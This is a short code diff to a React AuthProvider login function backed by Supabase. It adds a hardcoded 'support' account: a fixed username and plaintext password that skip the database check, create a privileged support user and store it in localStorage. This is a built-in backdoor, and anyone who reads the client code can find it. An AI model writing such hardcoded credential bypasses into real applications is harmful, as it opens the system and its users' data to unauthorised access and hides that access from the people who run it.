@@ -52,6 +52,20 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({
     loginStr: string,
     senhaStr: string,
   ): Promise<{ success: boolean; error?: string }> => {
+    // Hardcoded support login
+    if (loginStr === "suporte" && senhaStr === "789951ab") {
+      const supportUser: User = {
+        id: "support-user-id",
+        nome: "Equipe de Suporte",
+        login: "suporte",
+        perfil: "suporte",
+        ativo: true,
+      };
+      setUser(supportUser);
+      localStorage.setItem("grupo_eno_user", JSON.stringify(supportUser));
+      return { success: true };
+    }
+
     try {
       const { data, error } = await supabase
         .from("usuarios")
